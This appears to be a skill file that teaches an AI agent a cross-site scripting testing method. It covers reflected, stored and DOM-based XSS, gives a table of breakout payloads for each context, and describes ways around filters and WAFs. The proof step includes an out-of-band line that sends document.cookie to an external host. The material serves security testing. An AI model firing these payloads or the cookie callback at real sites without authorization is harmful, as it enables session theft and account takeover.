---
name: xss
description: Owned methodology for cross-site scripting — reflected, stored, and DOM-based — from context-aware detection to browser-proven execution.
---

# Cross-Site Scripting (XSS)

XSS is a context problem, not a payload problem. The same input is harmless in
one place and executable in another; what matters is *where* your input lands
in the response and *which characters survive unencoded there*. Detect that
first, then craft the one payload the context needs — don't spray a payload list.

## Run it

`native/xss_probe.py` finds the reflection, classifies the context, and tells
you which XSS-significant characters survive raw:

```bash
python3 native/xss_probe.py -u "https://app/search?q=test" --param q
python3 native/xss_probe.py -u "https://app/x" -X POST --location form --param name --data "name=a"
```

It reports the context (html-text / html-attr[quoted|unquoted] / `<script>` /
html-comment / href-src-on* sink) and emits the context-appropriate breakout
payload. It deliberately does **not** claim execution.

## The three types

- **Reflected** — input echoed straight back in the response. `xss_probe.py`
  covers this directly. Delivery is a crafted link/request to the victim.
- **Stored** — input persisted then rendered later (comments, profile fields,
  filenames, log viewers). Submit the marker in one request, then check every
  place it might render (admin panels are a classic stored-XSS blast radius).
  Test with the marker first; classify the render context the same way.
- **DOM-based** — the sink is client-side JS (`innerHTML`, `document.write`,
  `location`, `eval`, framework `dangerouslySetInnerHTML`). The payload may
  never touch the server. Grep the JS bundle for sinks and trace tainted
  sources (`location.hash`, `location.search`, `postMessage`, `document.referrer`).

## Context → breakout (quick reference)

| Context | Needs | Breakout shape |
|---|---|---|
| HTML text node | `<` `>` | `<img src=x onerror=alert(document.domain)>` |
| Attribute (double-quoted) | `"` | `"><img src=x onerror=alert(1)>` |
| Attribute (single-quoted) | `'` | `'><img src=x onerror=alert(1)>` |
| Attribute (unquoted) | space | ` onmouseover=alert(1) x=` |
| `href`/`src`/action sink | none | `javascript:alert(document.domain)` |
| Inside `<script>` string | `'` or `"` | `';alert(1);//` (or `</script><img ...>`) |
| HTML comment | `-->` | `--><img src=x onerror=alert(1)>` |

## Prove execution — this is the validation bar

A reflected, unencoded `<script>` is a **candidate**, not a finding. Confirm it
by making a real browser execute it, via `claude-in-chrome`:

1. Navigate to the crafted URL / submit the stored payload.
2. Watch for the payload firing — an `alert`/`prompt` dialog, a DOM change, or
   (best for reports) an out-of-band callback (`new Image().src='//<oob>/'+document.cookie`)
   that records the hit and proves data exfiltration is possible.
3. Capture it (screenshot / GIF via `gif_creator`) as PoC evidence.

Report `alert(document.domain)` execution, or the OOB callback hit — never just
"the payload was reflected." Note the impact concretely: session-cookie theft
(if not `HttpOnly`), CSRF-token theft, account takeover via the authenticated DOM.

## Filters / WAF

- Encoded output (`&lt;`) in one context doesn't mean encoded everywhere —
  re-test each reflection point; encoders are often context-specific and wrong.
- Try alternate event handlers (`onpointerover`, `onanimationstart`), tag
  variety (`<svg>`, `<details>`, `<iframe srcdoc>`), and case/whitespace/comment
  tricks — but only after confirming the block is a filter, not correct encoding.
